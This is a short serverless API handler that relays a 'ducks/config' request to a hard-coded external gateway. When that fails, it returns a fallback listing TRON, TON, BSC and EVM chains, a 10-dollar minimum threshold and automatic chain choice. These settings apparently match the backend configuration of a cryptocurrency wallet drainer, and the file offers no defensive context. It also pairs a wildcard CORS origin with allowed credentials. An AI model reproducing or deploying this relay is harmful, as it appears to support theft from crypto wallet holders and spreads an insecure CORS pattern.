export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  try {
    const { ref } = req.query || {};
    const targetGateway = process.env.NEXT_PUBLIC_GATEWAY_URL || "https://3web3d.online";
    const response = await fetch(`${targetGateway}/api/v3/ducks/config?ref=${encodeURIComponent(ref || '')}`, {
      method: "GET",
      headers: { "Accept": "application/json" }
    });
    const data = await response.json().catch(() => ({ active: true }));
    return res.status(response.status).json(data);
  } catch (err) {
    return res.status(200).json({ active: true, enabledChains: ["TRON", "TON", "BSC", "EVM"], minThresholdUsd: 10, preferredChain: "AUTO" });
  }
}